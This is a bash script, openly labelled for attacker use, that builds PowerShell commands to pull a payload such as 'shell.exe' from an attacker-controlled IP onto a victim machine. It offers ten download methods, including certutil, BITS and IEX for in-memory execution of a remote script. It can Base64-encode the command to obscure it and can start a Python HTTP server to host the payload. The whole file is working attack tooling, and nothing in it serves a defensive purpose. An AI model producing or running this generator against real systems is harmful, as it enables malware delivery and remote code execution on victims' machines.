#!/bin/bash

echo "==============================="
echo " PowerShell Transfer Generator"
echo "==============================="

read -p "Enter your attacker IP address: " IP
read -p "Enter port number (e.g., 80): " PORT
read -p "Enter payload filename (e.g., shell.exe or payload.ps1): " FILE
read -r -p "Enter output path on victim (e.g., C:\Users\Public\shell.exe): " OUTFILE

# Automatically escape backslashes for safe PowerShell embedding
OUTFILE_ESCAPED="${OUTFILE//\\/\\\\}"
URL="http://$IP:$PORT/$FILE"

echo ""
echo "Select transfer method:"
echo "1) Invoke-WebRequest"
echo "2) Invoke-RestMethod"
echo "3) WebClient (System.Net.WebClient)"
echo "4) HttpClient (System.Net.Http.HttpClient)"
echo "5) BITS (Start-BitsTransfer)"
echo "6) curl (alias)"
echo "7) wget (alias)"
echo "8) certutil (external)"
echo "9) iwx alias (custom Invoke-WebRequest)"
echo "10) IEX (in-memory PowerShell script execution)"
read -p "Choose [1-10]: " CHOICE

read -p "Do you want to Base64-encode the command? (y/n): " ENCODE
read -p "Do you want to save the output to a file? (y/n): " SAVE
read -p "Do you want to start a Python HTTP server on port $PORT in this directory? (y/n): " SERVE

case $CHOICE in
  1)
    CMD="Invoke-WebRequest -Uri '$URL' -OutFile '$OUTFILE_ESCAPED'"
    ;;
  2)
    CMD="Invoke-RestMethod -Uri '$URL' -OutFile '$OUTFILE_ESCAPED'"
    ;;
  3)
    CMD="(New-Object System.Net.WebClient).DownloadFile('$URL', '$OUTFILE_ESCAPED')"
    ;;
  4)
    CMD="\$client = New-Object System.Net.Http.HttpClient; \$bytes = \$client.GetByteArrayAsync('$URL').Result; [System.IO.File]::WriteAllBytes('$OUTFILE_ESCAPED', \$bytes)"
    ;;
  5)
    CMD="Start-BitsTransfer -Source '$URL' -Destination '$OUTFILE_ESCAPED'"
    ;;
  6)
    CMD="curl '$URL' -o '$OUTFILE_ESCAPED'"
    ;;
  7)
    CMD="wget '$URL' -OutFile '$OUTFILE_ESCAPED'"
    ;;
  8)
    echo ""
    echo "certutil -urlcache -split -f '$URL' '$OUTFILE'"
    [[ "$SAVE" =~ ^[Yy]$ ]] && echo "certutil -urlcache -split -f '$URL' '$OUTFILE'" > ps_transfer_output.txt
    [[ "$SERVE" =~ ^[Yy]$ ]] && echo "[*] Starting Python HTTP server on port $PORT..." && python3 -m http.server $PORT
    exit 0
    ;;
  9)
    CMD="Set-Alias iwx Invoke-WebRequest; iwx -Uri '$URL' -OutFile '$OUTFILE_ESCAPED'"
    ;;
  10)
    CMD="IEX (New-Object Net.WebClient).DownloadString('$URL')"
    ;;
  *)
    echo "Invalid selection."
    exit 1
    ;;
esac

echo ""
echo "==============================="
echo " Generated PowerShell Command"
echo "==============================="

if [[ "$ENCODE" =~ ^[Yy]$ ]]; then
    ENCODED=$(echo -n "$CMD" | iconv -t UTF-16LE | base64 -w 0)
    FINAL="powershell -EncodedCommand $ENCODED"
else
    FINAL="powershell -Command \"$CMD\""
fi

echo "$FINAL"

[[ "$SAVE" =~ ^[Yy]$ ]] && echo "$FINAL" > ps_transfer_output.txt && echo "[+] Saved to ps_transfer_output.txt"
[[ "$SERVE" =~ ^[Yy]$ ]] && echo "[*] Starting Python HTTP server on port $PORT..." && python3 -m http.server $PORT

echo ""
echo "==============================="
echo " Done."
echo "==============================="

